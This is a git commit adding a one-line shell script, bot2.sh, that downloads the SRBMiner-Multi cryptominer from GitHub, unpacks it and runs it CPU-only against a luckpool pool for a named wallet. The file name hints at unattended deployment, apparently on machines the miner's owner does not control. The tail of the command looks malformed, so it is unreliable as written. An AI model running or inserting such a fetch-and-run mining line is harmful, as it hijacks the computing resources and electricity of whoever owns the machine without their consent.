2d258709d90b12cc78292b6d5359df7fdebd0c1b
aquilNiick <aquilanicolas@myyahoo.com>
2024-06-16 18:09:20 -0300

    bot2.sh

---
+++ bot2.sh
@@ -0,0 +1,1 @@
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.2/SRBMiner-Multi-2-5-2-Linux.tar.gz && tar -xvf SRBMiner-Multi-2-5-2-Linux.tar.gz && cd SRBMiner-Multi-2-5-2 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RWCmghxFaWAWiF6tECkToJBs7Ydj8E4r9L.get -cpuThreads
